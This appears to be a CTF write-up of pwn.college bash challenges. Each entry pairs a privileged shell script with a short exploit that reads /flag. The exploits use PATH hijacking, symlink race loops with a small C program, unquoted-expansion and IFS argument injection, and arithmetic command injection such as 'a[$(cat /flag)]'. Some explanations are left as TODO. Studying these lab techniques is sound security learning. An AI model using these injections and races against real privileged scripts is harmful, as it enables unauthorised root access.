# The Transient Path

### chall

```sh
#!/opt/pwn.college/sh

fortune
```

### exploit
```
create shell script named 'fortune' in /home/hacker with content "cat /flag"
```

# Ferocious Functionality

### chall

```sh
#!/opt/pwn.college/bash

unset PATH
did you think you could hack this? It doesnt even exist!
```

### exploit
```sh
ln -s fortune did
```

last location where bash looks at for binary is current working directory

# The Surprising Swap

### chall
```sh
#!/usr/bin/env -iS /opt/pwn.college/bash

[ "$1" == "ping" ] && echo "pinged!" && read && "$0" pong
[ "$1" == "pong" ] && echo "ponged!"
```

### exploit
run /challenge/run via symlink
while /challenge/run is waiting for newline, swap symlink with 'cat /flag'

# Path of the Unquoted

### chall
```sh
#!/usr/bin/env -iS /opt/pwn.college/sh

PATH=/usr/bin

[ -n "$1" ] || exit 1
[ "$1" = "flag" ] && exit 2
[ $1 = "flag" ] && cat /flag

echo "Goodbye!"
```

### exploit
```sh
/challenge/run "1 = 1 -o flag"
```
due to unquoted expansion, was able to substitute $1 with any string

# Globbing Harmony

### chall
```sh
#!/usr/bin/env -iS /opt/pwn.college/sh

PATH=/usr/bin
cd /tmp
cat /flag | tr -d [A-Za-z0-9]
```

### exploit
```sh
touch /tmp/9
/challenge/run
```
"filename expansion" is used in tr command, which replaces that glob with matching file name, in our case by 9, and then truncates only character '9'.

# Zen of Expansion

### chall
```sh
#!/usr/bin/env -iS /opt/pwn.college/bash

PATH=/usr/bin

pretty_cat () {
	HEADER="Here is /etc/passwd!"
	FILE="/etc/passwd"
	[ -n "$1" ] && HEADER="$1" && shift
	[ -n "$1" ] && FILE="$1" && shift

	echo "####### $HEADER ########"
	cat "$FILE"
}

[ "$#" -eq 1 ] || exit 1
pretty_cat $*
```

### exploit
```sh
/challenge/run "a /flag"
```
unquoted expansion of $* leads to supplying second parameter to pretty_cat function, causing second parameter to move to FILE variable.

# Way of the Wildcard

### chall
```sh
#!/usr/bin/env -iS /opt/pwn.college/bash

PATH=/usr/bin

read FLAG < /flag
[[ "$FLAG" = $1 ]] && cat /flag
echo "Goodbye!"
```

### exploit
```sh
/challenge/run "*"
```
'*' is a wildcard, expanding to any possible string

# Saga of the Sneaky Similarity

### chall

```sh
#!/usr/bin/env -iS /opt/pwn.college/bash

PATH=/usr/bin
CHALLENGE=$RANDOM$RANDOM$RANDOM

[ -n "$1" ] || exit 1
[ $1 -eq "$CHALLENGE" ] && cat /flag
echo "Goodbye!"
```

### exploit
```sh
/challenge/run "0 -o 1"
```
TODO

# Enigma of the Environment

### chall

```sh
#!/usr/bin/env -iS /opt/pwn.college/bash

PATH=/usr/bin
WORKDIR=$(mktemp -d) || exit 1
cd $WORKDIR

echo -e "Welcome! This is a launcher that lets you set an environment variable and then run a program!\nUsage: $0 VARNAME VARVALUE PROGRAM"
[ "$#" -eq 3 ] || exit 2

if [ "$3" != "fortune" ]
then
	echo "Only 'fortune' is supported right now!"
	exit 1
else
	cp /usr/games/fortune $WORKDIR
	PROGRAM="$WORKDIR/fortune"
fi

declare -- "$1"="$2"
$PROGRAM
```

### exploit
```sh
/challenge/run PROGRAM bash fortune
```
'declare' command allows me to modify variable, so I modified 'PROGRAM' to run bash, becoming a root

# Voyage of the Variable

### chall
```sh
#!/usr/bin/env -iS /opt/pwn.college/bash

PATH=/usr/bin
WORKDIR=$(mktemp -d) || exit 1
cd $WORKDIR

echo -e "Welcome! This is a launcher that lets you set an environment variable and then run a program!\nUsage: $0 VARNAME VARVALUE PROGRAM"
[ "$#" -eq 3 ] || exit 2

if [ "$3" != "fortune" ]
then
	echo "Only 'fortune' is supported right now!"
	exit 3
else
	cp /usr/games/fortune $WORKDIR
	PROGRAM="$WORKDIR/fortune"
fi

[ "$1" = "PROGRAM" ] && exit 4
declare -- "$1"="$2"
$PROGRAM
```

### exploit
```
echo "cat /flag" > /tmp/tmp
/challenge/run IFS . fortune

OR

echo "cat /flag" > =a && chmod +x =a
/challenge/run PROGRAM=/home/hacker/ a fortune
```

# Dance of the Delimiters

### chall
```sh
#!/usr/bin/env -iS /opt/pwn.college/bash

PATH=/usr/bin
WORKDIR=$(mktemp -d) || exit 1
cd $WORKDIR

echo -e "Welcome! This is a launcher that lets you set an environment variable and then run a program!\nUsage: $0 VARNAME VARVALUE PROGRAM"
[ "$#" -eq 3 ] || exit 2

if [ "$3" != "fortune" ]
then
	echo "Only 'fortune' is supported right now!"
	exit 3
else
	cp /usr/games/fortune $WORKDIR
	PROGRAM="$WORKDIR/fortune"
fi

[[ "$1" = *PROGRAM* ]] && exit 4
declare -- "$1"="$2"
$PROGRAM
```

### exploit
```sh
echo "cat /flag" > /tmp/tmp && chmod +x /tmp/tmp
/challenge/run IFS . fortune
```

# Symphony of Separation

### chall
```sh
#!/usr/bin/env -iS /opt/pwn.college/bash

PATH=/usr/bin
WORKDIR=$(mktemp -d /tmp/tmpXXXXXXX) || exit 1
cd $WORKDIR

echo -e "Welcome! This is a launcher that lets you set an environment variable and then run a program!\nUsage: $0 VARNAME VARVALUE PROGRAM"
[ "$#" -eq 3 ] || exit 2

if [ "$3" != "fortune" ]
then
	echo "Only 'fortune' is supported right now!"
	exit 3
else
	cp /usr/games/fortune $WORKDIR
	PROGRAM="$WORKDIR/fortune"
fi

[[ "$1" = *PROGRAM* ]] && exit 4
declare -- "$1"="$2"
$PROGRAM
```

### exploit
```sh
echo "cat /flag" > /tmp/tmp && chmod +x /tmp/tmp
for in in {0..100}; do /challenge/run IFS 1 fortune; done | grep pwn
```
temporary directory is created with '/tmp/tmpXXXXXXX' pattern, out of 100 attempts, one could be created with first X equal to '1'.

# Tale of the Test

### chall
```sh
#!/usr/bin/env -iS /opt/pwn.college/bash

if [[ "$#" -ne 1 ]]
then
	echo "Usage: $0 SKILL_LEVEL"
	exit 1
fi

if [[ "$1" -eq 1337 ]]
then
	echo "Not skilled enough!"
	exit 2
fi

echo "You are quite skilled!"
```

### exploit
```sh
/challenge/run "a[\$(cat /flag)]"
```
TODO

# Masquerade of the Self

### chall
```sh
#!/usr/bin/env -iS /opt/pwn.college/sh

PATH=/usr/bin

case "$1" in
	"hi")
		echo hello
		;;
	"bye")
		echo ciao
		;;
	"help")
		echo "Usage: $0 ( hi | bye )"
		;;
	*)
		echo "Invalid command: $1"
		$0 help
		;;
esac
```

### exploit
program
```c
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

int main(int argc, char** argv) {
    while (1) {
        unlink("/home/hacker/zezva");
        symlink("/challenge/run", "/home/hacker/zezva");
        unlink("/home/hacker/zezva");
        symlink("/home/hacker/test.sh", "/home/hacker/zezva");
    }
}
```
```sh
while true; do ./program 2>/dev/null; done | grep pwn & ./program
```